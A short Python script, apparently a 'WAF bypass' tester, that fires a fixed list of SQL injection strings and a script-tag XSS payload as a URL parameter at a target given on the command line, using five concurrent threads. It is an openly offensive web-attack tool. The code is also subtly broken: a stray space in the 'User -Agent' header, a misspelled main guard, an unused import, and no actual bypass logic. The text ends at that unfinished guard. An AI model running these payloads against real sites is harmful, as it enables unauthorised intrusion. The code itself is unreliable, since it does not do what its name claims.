import requests
import sys
import threading
from urllib.parse import quote
from random import choice

# Sample payloads for demonstration
payloads = [
    "1' OR '1'='1",
    "<script>alert('XSS')</script>",
    "admin' --",
    "SELECT * FROM users WHERE username = 'admin' AND password = 'password'",
]

def send_request(url, payload, headers):
    # URL encode the payload
    encoded_payload = quote(payload)
    full_url = f"{url}?input={encoded_payload}"
    
    try:
        response = requests.get(full_url, headers=headers)
        print(f"Payload: {payload} | Response Code: {response.status_code} | Response Body: {response.text[:500]}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")

def worker(url, headers):
    for payload in payloads:
        send_request(url, payload, headers)

def main():
    if len(sys.argv) < 2:
        print("Usage: python waf_bypass.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    headers = {
        'User -Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Referer': 'http://example.com'
    }

    print(f"Starting WAF bypass testing on {url}...")
    
    # Create multiple threads for concurrent requests
    threads = []
    for i in range(5):  # Number of threads
        thread = threading.Thread(target=worker, args=(url, headers))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if _name_ == "_main_":
